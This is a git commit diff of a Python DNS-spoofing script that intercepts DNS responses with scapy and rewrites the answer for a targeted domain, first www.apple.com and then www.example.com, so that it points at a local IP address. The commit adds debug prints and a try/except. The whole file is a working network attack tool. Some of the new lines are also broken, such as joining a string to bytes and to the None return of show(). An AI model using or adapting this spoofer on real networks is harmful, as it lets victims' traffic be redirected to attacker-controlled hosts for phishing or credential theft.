25336ddabfac06110732ab01931ee33864c181fa
Michael Zick <michaelzick@gmail.com>
2022-08-20 05:17:50 -0700

    Added prints and try/except

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -8,19 +8,23 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if 'www.apple.com' in str(qname):
-            print('[+] Spoofing target.')
-            answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
-            print(scapy_packet.show())
+        print('qname: ' + qname)
+        if 'www.example.com' in str(qname):
+            try:
+                print('[+] Spoofing target.')
+                answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.224')
+                scapy_packet[scapy.DNS].an = answer
+                scapy_packet[scapy.DNS].ancount = 1
+                print('scapy_packet: ' + scapy_packet.show())
 
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].chksum
+                del scapy_packet[scapy.UDP].len
 
-            packet.set_payload(bytes(scapy_packet))
+                packet.set_payload(bytes(scapy_packet))
+            except:
+                print('[-] ' + IndexError)
 
     # packet.drop()
     packet.accept()
